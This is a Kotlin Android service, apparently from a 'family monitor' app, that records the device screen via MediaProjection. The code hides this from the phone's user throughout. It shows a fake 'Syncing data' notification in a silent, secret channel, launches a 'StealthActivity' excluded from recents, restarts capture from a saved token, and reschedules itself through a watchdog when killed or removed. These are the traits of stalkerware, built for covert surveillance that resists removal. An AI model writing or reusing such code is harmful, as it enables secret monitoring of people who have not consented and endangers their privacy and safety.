package com.example.family_monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat

class ScreenCaptureService : Service() {

    companion object {
        const val ACTION_START        = "START_SCREEN_CAPTURE"
        const val ACTION_STOP         = "STOP_SCREEN_CAPTURE"
        const val ACTION_START_SILENT = "START_SCREEN_CAPTURE_SILENT"
        const val EXTRA_RESULT_CODE   = "RESULT_CODE"
        const val EXTRA_RESULT_DATA   = "RESULT_DATA"
        const val CHANNEL_ID          = "fm_bg_sync"
        const val NOTIFICATION_ID     = 1001

        // In-memory: survives service restarts within the same OS process
        @Volatile var instance: ScreenCaptureService? = null
        @Volatile var savedResultCode: Int    = 0
        @Volatile var savedResultData: Intent? = null

        fun isDeviceAdminActive(ctx: Context): Boolean {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(ComponentName(ctx, FamilyDeviceAdminReceiver::class.java))
        }
    }

    inner class LocalBinder : Binder() { fun getService() = this@ScreenCaptureService }
    private val binder = LocalBinder()
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    var resultCode: Int   = 0
    var resultData: Intent? = null

    override fun onCreate() { super.onCreate(); instance = this; createChannel() }
    override fun onBind(intent: Intent?): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 0)
                @Suppress("DEPRECATION")
                resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                else intent.getParcelableExtra(EXTRA_RESULT_DATA)
                savedResultCode = resultCode
                savedResultData = resultData
                startCapture()
            }
            ACTION_START_SILENT -> {
                resultCode = savedResultCode; resultData = savedResultData
                if (resultCode != 0 && resultData != null) startCapture()
                else launchStealth()
            }
            ACTION_STOP -> { stopSelf(); return START_NOT_STICKY }
            null -> {   // restarted by OS via START_STICKY
                if (savedResultCode != 0 && savedResultData != null) {
                    resultCode = savedResultCode; resultData = savedResultData
                    startCapture()
                } else launchStealth()
            }
        }
        return START_STICKY
    }

    private fun launchStealth() {
        try {
            startActivity(Intent(applicationContext, StealthActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or
                         Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            })
        } catch (_: Exception) {}
    }

    private fun startCapture() {
        startFg()
        val pm   = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val data = resultData ?: return
        mediaProjection = pm.getMediaProjection(resultCode, data)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
            mediaProjection?.registerCallback(
                object : MediaProjection.Callback() { override fun onStop() = stopSelf() }, null)
        setupVirtualDisplay()
    }

    private fun startFg() {
        val n = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            startForeground(NOTIFICATION_ID, n,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        else startForeground(NOTIFICATION_ID, n)
    }

    private fun setupVirtualDisplay() {
        val mp = mediaProjection ?: return
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val w: Int; val h: Int; val d: Int
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val b = wm.currentWindowMetrics.bounds
            w = b.width(); h = b.height(); d = resources.configuration.densityDpi
        } else {
            val m = DisplayMetrics()
            @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(m)
            w = m.widthPixels; h = m.heightPixels; d = m.densityDpi
        }
        imageReader    = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mp.createVirtualDisplay("FamilyMonitorCapture", w, h, d,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader!!.surface, null, null)
    }

    fun getProjectionParams(): Pair<Int, Intent>? {
        val d = resultData ?: return null; return Pair(resultCode, d)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        WatchdogReceiver.schedule(applicationContext)
    }

    override fun onDestroy() {
        virtualDisplay?.release(); imageReader?.close(); mediaProjection?.stop()
        instance = null
        WatchdogReceiver.schedule(applicationContext)
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Background Services",
                NotificationManager.IMPORTANCE_NONE).apply {
                description       = "Required background service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Syncing data")
            .setContentText("Background sync in progress")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()
}
